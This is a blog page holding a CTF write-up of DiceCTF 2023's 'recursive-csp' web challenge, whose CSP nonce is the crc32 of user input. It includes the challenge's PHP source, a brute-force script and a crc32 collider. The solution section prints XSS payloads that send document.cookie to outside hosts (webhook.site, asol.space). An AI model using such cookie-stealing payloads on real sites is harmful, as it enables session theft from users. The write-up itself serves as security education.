@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>Recursive-csp - DiceCTF 2023 - My Blog</title><meta name="Description" content="Don&#39;t book a cover by it&#39;s judge"><meta property="og:title" content="Recursive-csp - DiceCTF 2023" />
+<meta property="og:description" content="
+    tl;dr
+Craft a payload with a random nonce
+Use something like hash-collider to collide the nonce we gave earlier
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://r0h1t.me/blog/posts/rescursive-csp/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-02-08T00:00:00+05:30" />
+<meta property="article:modified_time" content="2023-02-08T00:00:00+05:30" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Recursive-csp - DiceCTF 2023"/>
+<meta name="twitter:description" content="
+    tl;dr
+Craft a payload with a random nonce
+Use something like hash-collider to collide the nonce we gave earlier
+"/>
+<meta name="application-name" content="My Blog">
+<meta name="apple-mobile-web-app-title" content="My Blog">
+
+<meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://r0h1t.me/blog/posts/rescursive-csp/" /><link rel="next" href="http://r0h1t.me/blog/posts/jnotes/" /><link rel="stylesheet" href="/blog/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/blog/css/color.css"><link rel="stylesheet" href="/blog/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/blog/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/blog/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/blog/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/blog/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Recursive-csp - DiceCTF 2023",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/r0h1t.me\/blog\/posts\/rescursive-csp\/"
+        },"genre": "posts","keywords": "web, csp, dicectf23-writeups, ctf, writeup, nonce, hash-collision","wordcount":  536 ,
+        "url": "http:\/\/r0h1t.me\/blog\/posts\/rescursive-csp\/","datePublished": "2023-02-08T00:00:00+05:30","dateModified": "2023-02-08T00:00:00+05:30","publisher": {
+            "@type": "Organization",
+            "name": "Rohit"},"authors": [{
+                        "@type": "Person",
+                        "name": "Rohit"                    
+                    }],"description": ""
+    }
+    </script><script src="//instant.page/5.1.1" defer type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
+</head>
+
+<body header-desktop="" header-mobile=""><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('' === 'light' || '' === 'dark' || '' === 'black') setTheme(''), saveTheme(''); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-L6TEV86QF7"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-L6TEV86QF7');
+</script>
+<header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/blog/" title="My Blog">My Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/blog/posts/" title="Posts"> Posts </a><a class="menu-item" href="/blog/tags/"> Tags </a><a class="menu-item" href="/blog/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/blog/" title="My Blog">My Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/blog/posts/" title="Posts">Posts</a><a class="menu-item" href="/blog/tags/" title="">Tags</a><a class="menu-item" href="/blog/categories/" title="">Categories</a><a href="#" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Recursive-csp - DiceCTF 2023</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class='author'><i class="author fas fa-user-circle fa-fw"></i><span class='screen-reader-text'>  </span><a href='http://r0h1t.me/blog/authors/rohit'>Rohit</a></span>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/blog/categories/dicectf23-writeups/"><i class="far fa-folder fa-fw"></i>dicectf23-writeups</a>&nbsp;<a href="/blog/categories/all-writeups/"><i class="far fa-folder fa-fw"></i>All Writeups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-02-08">2023-02-08</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-02-08">2023-02-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;536 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;<span id="/blog/posts/rescursive-csp/" class="leancloud_visitors" data-flag-title="Recursive-csp - DiceCTF 2023">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class="leancloud-visitors-count waline-pageview-count" data-path="/blog/posts/rescursive-csp/"></span>&nbsp;views
+                    </span>&nbsp;<span id="/blog/posts/rescursive-csp/" class="comment_count" data-flag-title="Recursive-csp - DiceCTF 2023">
+                        <i class="far fa-comments fa-fw"></i>&nbsp;<span class="waline-comment-count" id="waline-comment-count" data-path="/blog/posts/rescursive-csp/"></span>&nbsp;comments
+                    </span>&nbsp;</div>
+        </div><div class="content" id="content"><h4 id="tldr" class="headerLink">
+    <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
+<li>Craft a payload with a random nonce</li>
+<li>Use something like hash-collider to collide the nonce we gave earlier</li>
+</ul>
+<h2 id="description" class="headerLink">
+    <a href="#description" class="header-mark"></a>Description</h2><p>the nonce isn&rsquo;t random, so how hard could this be?</p>
+<p>(the flag is in the admin bot&rsquo;s cookie)</p>
+<ul>
+<li><strong>Author</strong> : strellic</li>
+<li><strong>Category</strong> : Web</li>
+<li><strong>Points</strong> : 115</li>
+<li><strong>Solves</strong> : 178</li>
+</ul>
+<h2 id="solution" class="headerLink">
+    <a href="#solution" class="header-mark"></a>Solution</h2><h3 id="understanding-the-challenge" class="headerLink">
+    <a href="#understanding-the-challenge" class="header-mark"></a>Understanding the challenge</h3><p>Here we get the source for <code>\?source</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;source&#34;</span><span class="p">]))</span> <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;world&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">is_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">128</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nv">$nonce</span> <span class="o">=</span> <span class="nx">hash</span><span class="p">(</span><span class="s2">&#34;crc32b&#34;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Security-Policy: default-src &#39;none&#39;; script-src &#39;nonce-</span><span class="si">$nonce</span><span class="s2">&#39; &#39;unsafe-inline&#39;; base-uri &#39;none&#39;;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;title&gt;recursive-csp&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;h1&gt;Hello, &lt;?php echo $name ?&gt;!&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;h3&gt;Enter your name:&lt;/h3&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;form method=&#34;GET&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">      &lt;input type=&#34;text&#34; placeholder=&#34;name&#34; name=&#34;name&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">      &lt;input type=&#34;submit&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;/form&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;!-- /?source --&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
+</span></span></span></code></pre></div><p>It&rsquo;s a simple XSS Challenge in PHP. The catch is that there is a <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce" target="_blank" rel="noopener noreferrer">nonce</a> that prevents us from getting XSS directly and the nonce is basically the <a href="https://www.php.net/manual/en/function.crc32.php" target="_blank" rel="noopener noreferrer">crc32</a> hash of our payload. But our payload must contain the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce" target="_blank" rel="noopener noreferrer">nonce</a></p>
+<p>Basically <code>We should have the crc32 hash of the WHOLE MESSAGE inside the MESSAGE</code></p>
+<h3 id="trying-the-bruteforce" class="headerLink">
+    <a href="#trying-the-bruteforce" class="header-mark"></a>Trying the Bruteforce</h3><p>For a while, we were trying to brute force the nonce, hoping it will be the same at least one time since the crc32 has only 8 bytes.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mh">0xffffffff</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$x</span><span class="o">=</span><span class="nx">sprintf</span><span class="p">(</span><span class="s2">&#34;%08x&#34;</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$y</span><span class="o">=</span><span class="s1">&#39;&lt;script nonce=&#34;&#39;</span><span class="o">.</span><span class="nv">$x</span><span class="o">.</span><span class="s1">&#39;&#34;&gt;window.location=&#34;https://webhook.site/a0a221c5-6a61-4ff6-a1f5-438ed5ce9403/?x=&#34;+document.cookie&lt;/script&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="nv">$y</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nv">$z</span><span class="o">=</span><span class="nx">hash</span><span class="p">(</span><span class="s2">&#34;crc32b&#34;</span><span class="p">,</span> <span class="nv">$y</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nv">$z</span><span class="o">===</span><span class="nv">$x</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;found&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>But this never worked out 😢</p>
+<p>We tried this so for so long and while it was running we searched for other ways.</p>
+<h3 id="trying-the-collider" class="headerLink">
+    <a href="#trying-the-collider" class="header-mark"></a>Trying the collider</h3><p>So we searched for <code>crc32</code> collissions and got <a href="https://github.com/fyxme/crc-32-hash-collider" target="_blank" rel="noopener noreferrer">this</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">AddLetter</span><span class="p">(</span><span class="nx">c</span> <span class="kd">chan</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">combo</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">alphabet</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">length</span> <span class="kt">int</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Check if we reached the length limit
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// If so, we just return without adding anything
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="nx">length</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">newCombo</span> <span class="kt">string</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">ch</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">alphabet</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">newCombo</span> <span class="p">=</span> <span class="nx">combo</span> <span class="o">+</span> <span class="nb">string</span><span class="p">(</span><span class="nx">ch</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">c</span> <span class="o">&lt;-</span> <span class="nx">newCombo</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">AddLetter</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span> <span class="nx">newCombo</span><span class="p">,</span> <span class="nx">alphabet</span><span class="p">,</span> <span class="nx">length</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">worker</span><span class="p">(</span><span class="nx">wChan</span> <span class="kd">chan</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">target</span> <span class="kt">uint32</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="nx">tString</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">wChan</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">crc32</span><span class="p">.</span><span class="nf">ChecksumIEEE</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">tString</span><span class="p">))</span> <span class="o">==</span> <span class="nx">target</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Collision found:&#34;</span><span class="p">,</span> <span class="nx">tString</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>This is just a crc32 hash collider written in go. It will start with a String and append as many characters as <code>maxLen</code> would allow and try if the hash matches. So all that was left was for us to decide on a nonce and give its corresponding integer as the <code>target</code> in the code.</p>
+<p><strong>Note: Here we had to use a domain as the payload can only contain 127 characters and if we use webhook url we won&rsquo;t have enough charcters left to bruteforce</strong></p>
+<p>By running the code on 16 different laptops with 16 cores with 16 different nonces, we were able to collide it just in time.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&#34;e6377dcb&#34;</span><span class="p">&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s2">&#34;http://asol.space?x=&#34;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>000000000000000000000000000000000048io
+</span></span></code></pre></div><p>But we made one mistake in the domain to which the flag is sent. Where the domain was supposed to be <code>https://axol.space</code> I put <code>https://asol.space</code> 😭</p>
+<p>Now we had to put the correct domain and hash it again. This time it took even longer. It took so much time that we were just going to buy <code>https://asol.space</code>. But we collided that payload too and finally got the flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&#34;e6377dcb&#34;</span><span class="p">&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s2">&#34;http://asol.space?x=&#34;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>0000000000hytza
+</span></span></code></pre></div><p><strong>Flag</strong>: <code>dice{h0pe_that_d1dnt_take_too_l0ng}</code></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-02-08</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="#" title="Share on Twitter" data-sharer="twitter" data-url="http://r0h1t.me/blog/posts/rescursive-csp/" data-title="Recursive-csp - DiceCTF 2023" data-via="Lu513n" data-hashtags="web,csp,dicectf23-writeups,ctf,writeup,nonce,hash-collision"><i class="fab fa-twitter fa-fw"></i></a><a href="#" title="Share on Facebook" data-sharer="facebook" data-url="http://r0h1t.me/blog/posts/rescursive-csp/" data-hashtag="web"><i class="fab fa-facebook-square fa-fw"></i></a><a href="#" title="Share on Linkedin" data-sharer="linkedin" data-url="http://r0h1t.me/blog/posts/rescursive-csp/"><i class="fab fa-linkedin fa-fw"></i></a><a href="#" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://r0h1t.me/blog/posts/rescursive-csp/" data-title="Recursive-csp - DiceCTF 2023" data-web><i class="fab fa-whatsapp fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/blog/tags/web/">web</a>,&nbsp;<a href="/blog/tags/csp/">csp</a>,&nbsp;<a href="/blog/tags/dicectf23-writeups/">dicectf23-writeups</a>,&nbsp;<a href="/blog/tags/ctf/">ctf</a>,&nbsp;<a href="/blog/tags/writeup/">writeup</a>,&nbsp;<a href="/blog/tags/nonce/">nonce</a>,&nbsp;<a href="/blog/tags/hash-collision/">hash-collision</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/blog/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/blog/posts/jnotes/" class="next" rel="next" title="Jnotes - DiceCTF 2023">Jnotes - DiceCTF 2023<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="waline" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://waline.js.org/">Waline</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://r0h1t.me/" target="_blank" rel="noopener noreferrer">Rohit</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><link rel="stylesheet" href="/blog/lib/waline/waline.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"waline":{"comment":true,"copyright":true,"dark":"body[theme='dark'], body[theme='black']","el":"#waline","lang":"en","pageview":true,"serverURL":"https://r0h1t.me/blog/"}},"search":{"distance":100,"findAllMatches":true,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"useExtendedSearch":false},"sharerjs":true,"twemoji":true};</script><script type="text/javascript" src="/blog/lib/waline/waline.js" defer></script><script type="text/javascript" src="/blog/js/waline.min.js" defer></script><script type="text/javascript" src="/blog/lib/twemoji/twemoji.min.js" defer></script><script type="text/javascript" src="/blog/js/twemoji.min.js" defer></script><script type="text/javascript" src="/blog/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/blog/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/blog/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
